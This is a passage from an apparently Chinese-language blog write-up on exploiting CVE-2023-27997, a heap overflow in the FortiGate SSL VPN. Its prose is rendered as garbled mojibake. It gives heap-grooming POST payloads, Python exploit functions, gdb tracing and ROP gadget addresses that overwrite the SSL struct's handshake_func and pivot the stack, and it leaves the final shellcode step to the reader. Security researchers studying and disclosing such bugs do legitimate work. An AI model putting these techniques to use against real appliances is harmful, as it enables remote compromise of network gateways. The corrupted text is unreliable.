title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h3 id="åˆ©ç”¨åŸè¯­"><a href="#åˆ©ç”¨åŸè¯­" class="headerlink" title="åˆ©ç”¨åŸè¯­"></a>åˆ©ç”¨åŸè¯­</h3><p>é¦–å…ˆç¬¬ä¸€ä¸ªé—®é¢˜æ˜¯æˆ‘ä»¬æœ€ç»ˆé€‰æ‹©äº†  <code>/remote/hostcheck_validate</code>   æ¥åšæ¼æ´çš„è§¦å‘, ç”±äºæ¼æ´åˆ©ç”¨åŸå› éœ€è¦å¤šæ¬¡è¯·æ±‚, æˆ‘ä»¬å¦‚æœä½¿ç”¨äº† <code>/remote/logincheck</code>  å®¹æ˜“è§¦å‘ <code>login-attempt-limit</code> çš„é™åˆ¶, è¿™ä¸ªé»˜è®¤é™åˆ¶ä¸º 2</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-3c579214a9d839b632cc6a248fc70f20-30b511.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-3c579214a9d839b632cc6a248fc70f20-30b511.png" alt="image.png"></a></p><p>æ¥ç€å°±æ˜¯åˆ©ç”¨åŸè¯­çš„é—®é¢˜, è¿™é‡Œç›´æ¥é‡‡ç”¨äº†ä½œè€…æä¾›çš„æ–¹æ³• ^[2]</p><p>å¤§è‡´çš„æ ¸å¿ƒåŸç†å°±æ˜¯ä½¿ç”¨ä¸¤æ¬¡å¼‚æˆ–, è¿™æ ·å°±ä¸ä¼šè®©å‰é¢çš„æ•°å€¼å‘ç”Ÿæ··ä¹±.</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-96cdc2cf4791a8f7e3aae65753ebd0d8-e97ee9.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-96cdc2cf4791a8f7e3aae65753ebd0d8-e97ee9.png" alt="image.png"></a></p><p>å‡è®¾æˆ‘ä»¬è¦ä¿®æ”¹ 5000åç§»çš„å€¼ä¸º 0xff , . é‚£ä¹ˆæˆ‘ä»¬è¦æº¢å‡ºä¸¤æ¬¡, ç¬¬ä¸€æ¬¡å°†é•¿åº¦è®¾ç½®ä¸º 4999 , æ­¤æ—¶æº¢å‡ºç»“æŸåä¼šå°† 5000 ä½ç½®çš„å€¼å†™æˆ 0 , ç´§æ¥ç€ç¬¬äºŒæ¬¡ç”¨æˆ‘ä»¬è®¡ç®—å¥½çš„ seed  é€šè¿‡ <code>0xff ^ 0 </code>çš„æ–¹å¼ , å°†5000ä½ç½®è®¾ç½®æˆ 0xff </p><p>æŒ‰ç…§ä½œè€…è¯´æ˜å°±æ˜¯ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-4e0284df44bd40b0e419b74bfced6499-4446fa.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-4e0284df44bd40b0e419b74bfced6499-4446fa.png" alt="image.png"></a></p><h3 id="å †å¸ƒå±€"><a href="#å †å¸ƒå±€" class="headerlink" title="å †å¸ƒå±€"></a>å †å¸ƒå±€</h3><p>æˆ‘ä»¬çš„ç›®æ ‡æ˜¯å»æº¢å‡ºè¦†ç›– SSL ç»“æ„ä¸­çš„ <code>handshake_func</code> æŒ‡é’ˆï¼Œ è¿™åˆ©ç”¨æ˜¯å‚è€ƒçš„ orange å½“æ—¶çš„ä¸€ä¸ªåšå®¢ ^[3]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SSL_do_handshake</span><span class="params">(SSL *s)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">     s-&gt;method-&gt;ssl_renegotiate_check(s, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (SSL_in_init(s) || SSL_in_before(s)) &#123;</span><br><span class="line">         <span class="keyword">if</span> ((s-&gt;mode &amp; SSL_MODE_ASYNC) &amp;&amp; ASYNC_get_current_job() == <span class="literal">NULL</span>) &#123;</span><br><span class="line">             <span class="class"><span class="keyword">struct</span> <span class="title">ssl_async_args</span> <span class="title">args</span>;</span></span><br><span class="line"></span><br><span class="line">             args.s = s;</span><br><span class="line"></span><br><span class="line">             ret = ssl_start_async_job(s, &amp;args, ssl_do_handshake_intern);</span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             ret = s-&gt;handshake_func(s);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> ret;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>SSL ç»“æ„ä½“å¦‚ä¸‹ ^[4]:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ssl_st</span> &#123;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * protocol version (one of SSL2_VERSION, SSL3_VERSION, TLS1_VERSION,</span></span><br><span class="line"><span class="comment">     * DTLS1_VERSION)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">int</span> version;</span><br><span class="line">    <span class="comment">/* SSLv3 */</span></span><br><span class="line">    <span class="keyword">const</span> SSL_METHOD *method;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * There are 2 BIO&#x27;s even though they are normally both the same.  This</span></span><br><span class="line"><span class="comment">     * is so data can be read and written to different handlers</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">/* used by SSL_read */</span></span><br><span class="line">    BIO *rbio;</span><br><span class="line">    <span class="comment">/* used by SSL_write */</span></span><br><span class="line">    BIO *wbio;</span><br><span class="line">    <span class="comment">/* used during session-id reuse to concatenate messages */</span></span><br><span class="line">    BIO *bbio;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This holds a variable that indicates what we were doing when a 0 or -1</span></span><br><span class="line"><span class="comment">     * is returned.  This is needed for non-blocking IO so we know what</span></span><br><span class="line"><span class="comment">     * request needs re-doing when in SSL_accept or SSL_connect</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">int</span> rwstate;</span><br><span class="line">    <span class="keyword">int</span> (*handshake_func) (SSL *);</span><br></pre></td></tr></table></figure><p>é‚£è¿™çš„é—®é¢˜å°±æ˜¯è½¬åŒ–ä¸ºï¼Œ æˆ‘ä»¬å¦‚ä½•ç¨³å®šçš„å°† <code>out</code> è¿™ä¸ªç¼“å†²åŒºæ”¾ç½®åœ¨  SSL ç»“æ„ä½“çš„ç¼“å†²åŒºå‰é¢ï¼Œ è¿™æ ·æº¢å‡ºçš„æ—¶å€™æˆ‘ä»¬æ‰èƒ½è¦†ç›–åˆ°ã€‚è¿™é‡Œæˆ‘ä»¬å‚è€ƒäº†éƒ¨åˆ†ä½œè€…çš„æ€è·¯ï¼Œ åœ¨æˆ‘ä»¬è¿™ä¸ªæµ‹è¯•ç‰ˆæœ¬ä¸­ï¼Œ  SSL ç»“æ„çš„å¤§å°ä¸º 0x1db8 å­—èŠ‚ï¼Œ ä»–å°†åˆ†é…åœ¨ 0x2000  çš„ç¼“å†²åŒºå†… ã€‚ å¦å¤–æä¸€å¥è¿™é‡Œçš„å †åˆ†é…å™¨ç”¨çš„æ˜¯ jemalloc  ï¼Œ ç¬¦åˆä¸€äº›åè¿›å…ˆå‡ºçš„è§„åˆ™ï¼Œå› æ­¤æˆ‘ä»¬çš„æœ€ç»ˆæ€è·¯å¤§æ¦‚å°±æ˜¯ï¼š</p><p>æˆ‘ä»¬ç”¨äº† gdb è®¾ç½®å½“å‰ PC ä¸º <code>je_malloc_stats_print</code> å‡½æ•°åœ°å€ï¼Œæ‰“å°å½“å‰ <code>jemalloc</code> çš„åˆ†é…æƒ…å†µ</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-d1f8e940e7046fe389e9ecf78392c333-9e4181.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-d1f8e940e7046fe389e9ecf78392c333-9e4181.png" alt="image.png"></a></p><p>å¯ä»¥å‘ç°é»˜è®¤æƒ…å†µä¸‹ <code>0x2000</code> è¿™ä¹ˆçš„å¤§çš„å†…å­˜æ˜¯ä¸ä¼šæ€ä¹ˆä½¿ç”¨åˆ°çš„ï¼Œ å› æ­¤æˆ‘ä»¬åªéœ€è¦å…ˆåˆ†é…å‡ æ¬¡ ï¼ˆè¿™é‡Œä½¿ç”¨ 10 æ¬¡ ï¼‰åˆ†é…0x2000 çš„ bufferï¼Œç„¶åé‡Šæ”¾æ‰è®©è¿™è¿ç»­çš„å†…å­˜è¿›å…¥åˆ°é“¾è¡¨é‡Œï¼Œæ–¹ä¾¿åé¢åˆ©ç”¨çš„æ—¶å€™è®© out çš„ç¼“å†²åŒºåœ¨ ssl ç»“æ„ä½“å‰é¢ã€‚è¿™é‡Œçš„åˆ†é…åŸç†æ˜¯é€šè¿‡ä¸€ä¸ªè¯·æ±‚ç»™ä¸€ä¸ªè§£æPOSTå‚æ•°çš„ç½‘é¡µ ï¼Œ åœ¨è¿™ä¸ªè¯·æ±‚ä¸­ï¼Œå‘é€äº†POST key-valueå¯¹ï¼Œ å…¶ä¸­sizeof(key) = sizeof(struct_ssl) - 0x18 - 0x10 è€Œsizeof(value)=0 ï¼Œ ä¾‹å¦‚æˆ‘ä»¬å‘é€ä¸€ä¸ª</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;remote&#x2F;hostcheck_validate HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">A*(sizeof(struct_ssl) - 0x18 - 0x10)&#x3D;&amp;</span><br></pre></td></tr></table></figure><p>è¿™æ ·ç†æƒ³æƒ…å†µä¸‹ä¼šåˆ†åˆ†é…ä¸€ä¸ªå¦‚ä¸‹çš„å†…å­˜ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-ce0846e872e41e303b2eca5ef364df90-704e11.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-ce0846e872e41e303b2eca5ef364df90-704e11.png" alt="image.png"></a></p><p>æœ‰ä¸‰ä¸ª <code>AAAA</code> çš„å†…å­˜åŸå› æ˜¯åœ¨è§£æPOSTæ•°æ®çš„æ—¶å€™ï¼Œç¨‹åºä¼šè¿™ä¹ˆåšï¼šæ‹¿åˆ°æ•´ä¸ªPOSTDATAç¼“å†²åŒºï¼ˆä¾‹å¦‚a=b&amp;c=d&amp;e=fï¼‰ï¼Œç„¶åæå–å‡ºâ€™&amp;â€™ä¹‹å‰çš„å†…å®¹ï¼Œå¹¶æŠŠå®ƒå­˜å‚¨åœ¨ä¸€ä¸ªæ–°çš„å—é‡Œï¼ˆé‚£æ˜¯1ä¸ªåˆ†é…ï¼‰ã€‚ç„¶åï¼Œæ‹¿åˆ°â€™=â€™ä¹‹å‰çš„å†…å®¹ï¼Œå¹¶æŠŠå®ƒå­˜å‚¨åœ¨ä¸€ä¸ªæ–°çš„å—é‡Œï¼ˆä¸¤ä¸ªåˆ†é…ï¼‰ã€‚ç„¶åï¼Œå®ƒå°†é”®å’Œå€¼å­˜å‚¨åœ¨ä¸€ä¸ªå…¨å±€å“ˆå¸Œæ˜ å°„ä¸­ï¼Œè¿™ä¼šå¯¼è‡´äº§ç”Ÿç¬¬ä¸‰ä¸ªåˆ†é…</p><p>è¿™é‡Œä¸ºäº†æ–¹ä¾¿è§‚å¯Ÿåˆ†é…çš„æƒ…å†µï¼Œ æˆ‘ä»¬è¿˜å¯ä»¥ç”¨åˆ° gdb çš„commands å’Œ logging åŠŸèƒ½ã€‚å¤§è‡´å°±æ˜¯åœ¨ <code>je_malloc</code> åˆ†é…ç»“æŸåä¸‹æ–­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;.text:0000000001776C85 E8 D6 5A CC+                call    _je_malloc</span><br><span class="line">&#x2F;&#x2F;.text:0000000001776C8A 49 89 C4                    mov     r12, rax</span><br><span class="line">break *0x1776C8A </span><br><span class="line">commands 1</span><br><span class="line">set logging file ssl_chunk.txt</span><br><span class="line">set logging enable on</span><br><span class="line">p&#x2F;x $rax</span><br><span class="line">set logging enable off</span><br><span class="line">continue</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°½é‡è®©å…¶åˆ†é…çš„æ—¶å€™æ˜¯è¿ç»­çš„å†…å­˜ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-bc72ef0094686857032b3a9e058315e3-c9a332.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-bc72ef0094686857032b3a9e058315e3-c9a332.png" alt="image.png"></a></p><p>å½“ç„¶åœ¨å®é™…ç¯å¢ƒä¸­å¯èƒ½æœ‰å…¶ä»–çš„å¹²æ‰°ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å¤šåˆ†é…å‡ æ¬¡ ï¼Œä¾‹å¦‚æˆ‘ä¸Šä¸ªç‰ˆæœ¬çš„åˆ©ç”¨æ˜¯åˆ†é…äº† <code>301</code> æ¬¡ï¼Œ ç„¶ååœ¨è¿™å‡ ä¸ª sock éƒ½closeæ‰è®©å…¶é‡Šæ”¾ã€‚æˆ‘è¿™éƒ¨åˆ†ä»£ç å¦‚ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">heap_layout</span>(<span class="params">IP, port</span>):</span></span><br><span class="line">    <span class="comment"># heap layout</span></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">import</span> string</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string.printable[:<span class="number">10</span>]:</span><br><span class="line">        payload += i*(size) + <span class="string">&#x27;=&amp;&#x27;</span></span><br><span class="line"></span><br><span class="line">    sock = make_ssl_socket(IP, port, if_warp=<span class="literal">True</span>)</span><br><span class="line">    sock = set_heap_fengshui(sock, payload)</span><br><span class="line">    sock.close()</span><br></pre></td></tr></table></figure><p>è¿™æ ·ä¹‹åï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸¤ä¸ª sock  ï¼Œ ä»£ç å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_rewrtie_ssl_struct</span>(<span class="params">IP, port, salt, seeds</span>):</span></span><br><span class="line">    log.info(<span class="string">&#x27;Creating sockets...&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    vul_sock = make_ssl_socket(IP, port, if_warp=<span class="literal">True</span>)</span><br><span class="line">    sock4 = make_ssl_socket(IP, port)</span><br><span class="line">    sock4.sendall(<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&#x27;Rewrite SSL struct&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> seed <span class="keyword">in</span> seeds:</span><br><span class="line">        <span class="keyword">for</span> offset <span class="keyword">in</span> seed:</span><br><span class="line">            write_value(vul_sock, salt, seed[offset].decode(<span class="string">&#x27;latin1&#x27;</span>), offset)</span><br><span class="line">    <span class="keyword">return</span> (vul_sock, sock4)</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ä¸€ä¸ª <code>vul_sock</code> æ˜¯ç”¨æ¥æº¢å‡º buffer ï¼Œ ç„¶å sock4 æ˜¯ç”¨æ¥åˆ†é… ssl ç»“æ„ä½“ï¼Œ ç”¨æ¥è¢«æº¢å‡ºçš„ã€‚ è¿™æ ·ä¹‹åæˆ‘ä»¬å°±èƒ½ç¨³å®šè§¦å‘æº¢å‡ºï¼Œä¸”ç¨³å®šçš„è®© ssl ç»“æ„ä½“åˆ†é…åœ¨ out çš„ç¼“å†²åŒºåé¢<br>ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-a4930365eb0a53489ff736eff83e0c9e-f36a67.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-a4930365eb0a53489ff736eff83e0c9e-f36a67.png" alt="image.png"></a></p><h3 id="æ ˆè¿ç§»"><a href="#æ ˆè¿ç§»" class="headerlink" title="æ ˆè¿ç§»"></a>æ ˆè¿ç§»</h3><p>å½“è§¦å‘æº¢å‡ºçš„æ—¶å€™ï¼Œ æˆ‘ä»¬çš„è¿™ä¸ªæ—¶å€™æŒ‡é’ˆå’Œå†…å­˜å¤§æ¦‚å¦‚ä¸‹ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-4994090cd5a6c71e1d1c02b3a843fe13-a5245c.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-4994090cd5a6c71e1d1c02b3a843fe13-a5245c.png" alt="image.png"></a></p><p>æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå½“æˆ‘ä»¬æ§åˆ¶ PC  åï¼Œ è¿™é‡Œçš„ <code>RDI</code> å¯„å­˜å™¨æŒ‡å‘çš„æ˜¯æˆ‘ä»¬çš„ ssl ç»“æ„ä½“ï¼Œ å› æ­¤ç¬¬ä¸€ä¸ªæ¶Œä¸Šçš„æ€è·¯æ˜¯åšæ ˆè¿ç§»ï¼Œ æ‰¾ä¸€ä¸ªç±»ä¼¼äº</p><p><code>push rdi; pop rsp; ... ; ret </code> çš„ gadget å³å¯ï¼Œ æˆ‘ä»¬æœ€åä½¿ç”¨çš„æ˜¯ <code>push_rdi_pop_rsp = 0x669129 # push rdi ; pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</code></p><p>è¿™æ ·å°±å°†æ ˆæˆåŠŸè¿ç§»åˆ°äº†æˆ‘ä»¬çš„ ssl stuct ï¼Œ å³å¯æ§çš„å¯å†™çš„ç¼“å†²åŒºå†…ã€‚ ç„¶åè¿™é‡Œé¢„æœŸç›´æ¥åœ¨ ssl ç¼“å†²åŒºæ¥ç€å†™æˆ‘ä»¬å‰©ä¸‹çš„ <code>gadget</code> ï¼Œ ä½†æ˜¯è¿™é‡Œçªç„¶å‘ç°äº†ä¸€ä¸ªé—®é¢˜ï¼Œ ssl struct ä¼¼ä¹æœ‰å¾ˆå¤šç»“æ„ä½“ä¸èƒ½è¢«å†™ï¼Œ ä¸€å†™å°±æŠ¥é”™ ã€‚</p><p>äºæ˜¯æˆ‘åœ¨è¿™é‡Œæ¢äº†ä¸ªæ€è·¯ï¼Œ æ¥ç€å°è¯•å¸ƒå±€å †ç»“æ„ï¼Œç†æƒ³æƒ…å†µåº”è¯¥æ˜¯ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-feac6e93867e3afd30cd73f00de7c7f0-2031ee.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-feac6e93867e3afd30cd73f00de7c7f0-2031ee.png" alt="image.png"></a></p><p>æˆ–è€…</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-8af32ae43ee156ed62aff6c50e7ba555-cc0cbe.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-8af32ae43ee156ed62aff6c50e7ba555-cc0cbe.png" alt="image.png"></a></p><p>åœ¨ out å‰é¢ ï¼Œ æˆ–è€… ssl struct çš„åé¢å¸ƒå±€ä¸€å—å®Œå…¨å¯æ§çš„å†…å­˜ï¼Œ ä½†æ˜¯ç”±äºæˆ‘ä»¬çš„è¿™å—å®Œå…¨å¯æ§çš„å†…å­˜æ˜¯ä¸èƒ½è¢« 00 æˆªæ–­çš„ï¼Œ å› æ­¤key-value å¯¹çš„  key ä¼¼ä¹æ˜¯ä¸èƒ½ç”¨æ¥å¸ƒå±€çš„ï¼Œä½†æ˜¯è¿™é‡Œæˆ‘æƒ³äº†ä¸‹ï¼Œ key ä¸èƒ½è¢«ç”¨æ¥å¸ƒå±€å †ï¼Œ ä½†æ˜¯ value åº”è¯¥æ˜¯å¯ä»¥çš„ï¼ï¼ å› æ­¤æˆ‘åœ¨æº¢å‡ºç»“æŸä¹‹åï¼Œ æ¥ç€å°è¯•ç”¨å¦‚ä¸‹ä»£ç å‘åŒ…ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">layout_gadget</span>(<span class="params">IP, port</span>):</span></span><br><span class="line">    ropchain = build_ropchain(args)</span><br><span class="line">    sock = make_ssl_socket(IP, port, if_warp=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        junk = cyclic(size, n=<span class="number">8</span>)</span><br><span class="line">        pay = bytearray(junk)</span><br><span class="line">        <span class="comment">#pay[1: 1+13 * 8] = p64(ret) * 13</span></span><br><span class="line">        <span class="comment">#pay[105:105+len(ropchain)]  = ropchain</span></span><br><span class="line">        junk = bytes(pay)</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&#x27;aaaa&#x27;</span> + <span class="string">&#x27;=&#x27;</span> + junk + <span class="string">&#x27;&amp;&#x27;</span> + <span class="string">&#x27;bbbb&#x27;</span> + <span class="string">&#x27;=&#x27;</span> + junk + <span class="string">&#x27;&amp;&#x27;</span> + <span class="string">&#x27;cccc&#x27;</span> + <span class="string">&#x27;=&#x27;</span> + junk + <span class="string">&#x27;&amp;&#x27;</span> + <span class="string">&#x27;dddd&#x27;</span> + <span class="string">&#x27;=&#x27;</span> + junk + <span class="string">&#x27;&amp;&#x27;</span> + <span class="string">&#x27;eeee&#x27;</span> + <span class="string">&#x27;=&#x27;</span> + junk </span><br><span class="line">        payload += <span class="string">&#x27;&amp;username=vvvv&#x27;</span></span><br><span class="line">        sock = set_heap_fengshui(sock, payload)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> sock</span><br></pre></td></tr></table></figure><p>æˆåŠŸåœ¨ out ç¼“å†²åŒºå†™ä¸‹äº†ä¸€å—å¯æ§çš„å†…å­˜</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-d9a69e8ee03dbce4df4a250e873625d0-092293.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-d9a69e8ee03dbce4df4a250e873625d0-092293.png" alt="image.png"></a></p><p>å› æ­¤æ­¤æ—¶å†…å­˜ç»“æ„å¦‚ä¸‹ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-b44f04c102f10f092eb78af81e384f08-6327ef.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-b44f04c102f10f092eb78af81e384f08-6327ef.png" alt="image.png"></a></p><p>ç”±äº ssl struct æœ‰å¾ˆå¤šä¸èƒ½å†™çš„åœ°æ–¹ï¼Œ äºæ˜¯æˆ‘æƒ³åˆ°ä¸€ä¸ªæ–¹æ³•ï¼Œ å°è¯•å»æ‰¾å¤§é‡è¿ç»­æ˜¯ 0 çš„ç¼“å†²åŒºï¼Œ ç„¶åä»…ä»…å†™å…¥å¦å¤–ä¸€æ®µ stack pivot chainï¼Œå°†æ ˆè¿ç§»åˆ°å‰é¢çš„å¯æ§ç¼“å†²åŒºä¸­ ã€‚æœ€åæˆ‘ä½¿ç”¨äº†è¿™æ ·çš„ chain ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x000000000060bdb4   # pop rax ; pop rdx ; ret</span><br><span class="line">bss_addr &#x3D; 0x4698eb0 # -&gt; rax</span><br><span class="line">offfset &#x3D;  0x26e0-1  # rdx -&gt; ropchain</span><br><span class="line">0x61a292  # : sub rsp, rdx ; dec dword ptr [rax - 0x77] ; ret</span><br></pre></td></tr></table></figure><p>é€šè¿‡è¿™æ¡ chainï¼Œ å°†æ ˆè¿ç§»åˆ°å‰é¢çš„ç¼“å†²åŒºï¼Œ è¿›è¡Œæ›´å¤æ‚çš„æ“ä½œã€‚</p><h3 id="æ‰§è¡Œä»»æ„æŒ‡ä»¤"><a href="#æ‰§è¡Œä»»æ„æŒ‡ä»¤" class="headerlink" title="æ‰§è¡Œä»»æ„æŒ‡ä»¤"></a>æ‰§è¡Œä»»æ„æŒ‡ä»¤</h3><p>åœ¨å®Œæˆæ­¤éƒ¨åˆ†ä¹‹åï¼Œæ¥ä¸‹æ¥å°±æ˜¯ç»„è£…ROPé“¾çš„è¿‡ç¨‹äº†ã€‚å°½ç®¡è¯¥ç¨‹åºéå¸¸åºå¤§ï¼Œä»¥è‡³äºå‡ ä¹å¯ä»¥æ‰¾åˆ°æ‰€éœ€çš„ä»»ä½•gadgeté“¾ï¼Œä½†æ‰¾å¯»gadgetç»ˆç©¶æ˜¯ä¸€ä¸ªç›¸å¯¹ç¹ççš„ä»»åŠ¡ã€‚å› æ­¤ï¼Œæœ€åå†³å®šé‡‡ç”¨mprotect + shellcodeçš„æ–¹æ³•ã€‚é¦–å…ˆï¼Œåˆ©ç”¨ä¸€äº›gadgetå°†rdiæŒ‡å‘ROPé“¾çš„å†…å­˜å¼€å¤´ã€‚</p><p>è¿™ä¸€éƒ¨åˆ†å†…å®¹å°±ç•™ä½œç»™è¯»è€…å®Œæˆå§</p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><blockquote class="twitter-tweet"><p lang="en" dir="ltr">I learned a lot from <a href="https://twitter.com/cfreal_?ref_src=twsrc%5Etfw">@cfreal_</a> , and it&#39;s great to write exploits together with <a href="https://twitter.com/leommxj?ref_src=twsrc%5Etfw">@leommxj</a>.<a href="https://twitter.com/hashtag/CVE?src=hash&amp;ref_src=twsrc%5Etfw">#CVE</a>-2023-27997 <a href="https://t.co/nEFndgvoVD">pic.twitter.com/nEFndgvoVD</a></p>&mdash; swing (@bestswngs) <a href="https://twitter.com/bestswngs/status/1669969165392953344?ref_src=twsrc%5Etfw">June 17, 2023</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><h2 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link"></a>Reference link</h2><p>^[1]   <a href="https://labs.watchtowr.com/xortigate-or-cve-2023-27997/">https://labs.watchtowr.com/xortigate-or-cve-2023-27997/</a><br>^[2]  <a href="https://blog.lexfo.fr/xortigate-cve-2023-27997.html">https://blog.lexfo.fr/xortigate-cve-2023-27997.html</a><br>^[3] <a 